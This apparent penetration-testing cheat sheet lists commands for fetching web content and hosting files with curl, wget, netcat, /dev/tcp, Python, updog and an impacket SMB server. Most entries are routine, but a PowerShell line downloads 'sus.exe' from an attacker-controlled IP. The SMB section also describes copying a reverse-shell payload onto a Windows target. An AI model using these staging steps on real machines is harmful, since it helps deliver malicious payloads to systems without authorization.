# Server Interactions

## <mark style="color:red;">Interact with Servers</mark>

<table data-header-hidden data-full-width="true"><thead><tr><th width="606">Command</th><th>Description</th></tr></thead><tbody><tr><td><mark style="color:yellow;"><code>curl -v http://&#x3C;ip></code></mark></td><td>Access a website</td></tr><tr><td><mark style="color:yellow;"><code>curl -X POST http://website -d 'username=user&#x26;password=pa$$word'</code></mark></td><td>Use POST method to login to website</td></tr><tr><td><mark style="color:yellow;"><code>curl -o stuff.html http://website/stuff.html</code></mark></td><td>Save to file</td></tr><tr><td><mark style="color:yellow;"><code>wget https://website.com/file.txt</code></mark></td><td>Pull specified file</td></tr><tr><td><mark style="color:yellow;"><code>wget -r http://&#x3C;ip></code></mark></td><td>Download all files recursively</td></tr><tr><td><mark style="color:yellow;"><code>wget -r ftp://&#x3C;ip></code></mark></td><td>Download the files from FTP server</td></tr><tr><td><mark style="color:yellow;"><code>ftp &#x3C;ip></code></mark></td><td>Connect to FTP</td></tr><tr><td><mark style="color:yellow;"><code>sftp &#x3C;ip></code></mark></td><td>Secure FTP</td></tr><tr><td><mark style="color:yellow;"><code>powershell -c wget http://&#x3C;localIP>:8080/sus.exe -outfile sus.exe</code></mark></td><td>Download from URL</td></tr></tbody></table>

Send Cookie settings with data, then pipe results:

{% code overflow="wrap" %}
```bash
curl 'website' -H 'Cookie: name=user; settings=1,2,3,4,5,6,7' --data 'name=User' | base64 -d > item.png
```
{% endcode %}

Connect and send HTTP Request.

```bash
nc www.example.com 80
```

This will take you to a blank line. \
This means you are connected but will display nothing until you send a HTTP request

```bash
GET / HTTP/1.1
```

OR

```bash
GET /
```

Interact with a webpage using /dev/tcp:

{% code overflow="wrap" %}
```
exec 3<>/dev/tcp/www.google.com/80

echo -e "GET / HTTP/1.1\r\nhost: http://www.google.com\r\nConnection: close\r\n\r\n" >&3

cat <&3
```
{% endcode %}

## <mark style="color:red;">Create a Server</mark>

### <mark style="color:purple;">Python</mark>

| <mark style="color:yellow;">`python3 -m http.server`</mark>      | Creates a Python HTTP server |
| ---------------------------------------------------------------- | ---------------------------- |
| <mark style="color:yellow;">`python3 -m SimpleHTTPServer`</mark> | Creates a Python HTTP server |

There is no indexing with this method.

You need to know exact file location when pulling a file.

### <mark style="color:purple;">Updog</mark>

| <mark style="color:yellow;">`updog`</mark>                     | Serve from your current dir |
| -------------------------------------------------------------- | --------------------------- |
| <mark style="color:yellow;">`updog -d /dir`</mark>             | Serve from another dir      |
| <mark style="color:yellow;">`updog -p 1234`</mark>             | Serve from port 1234        |
| <mark style="color:yellow;">`updog --password pa$$word`</mark> | Password protect the page   |
| <mark style="color:yellow;">`Updog --ssl`</mark>               | Use an SSL connection       |
| <mark style="color:yellow;">`pip3 install updog`</mark>        | Install Updog               |

Note: updog uses HTTP basic authentication.

To login, you should leave the username blank and just enter the password in the password field.

https://github.com/sc0tfree/updog

### <mark style="color:purple;">Netcat</mark>

#### <mark style="color:green;">Serve a basic webpage</mark>

<table data-header-hidden data-full-width="true"><thead><tr><th width="528">Command</th><th>Description</th></tr></thead><tbody><tr><td><mark style="color:yellow;"><code>nc -lp 1234 &#x3C; index.html</code></mark></td><td>This will serve the page only once then quit</td></tr><tr><td><mark style="color:yellow;"><code>while true; do nc -lp 8080 &#x3C; index.html; done</code></mark></td><td>This will keep it up until you stop it</td></tr></tbody></table>

#### <mark style="color:green;">Pulling a webpage</mark>

Connect and send HTTP Request.

```bash
nc www.example.com 80
```

This will take you to a blank line. This means you are connected but will display nothing until you send a HTTP request

```bash
GET / HTTP/1.1
```

OR

```bash
GET /
```

### <mark style="color:purple;">SMB server</mark>

```bash
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py <yourHostname> .
```

Transfer to windows using SMB. Put your reverse shell in the pwd and run this on the target:

```bash
copy \\10.10.10.1\<YourHostname>\sus.exe C:\sus.exe
```
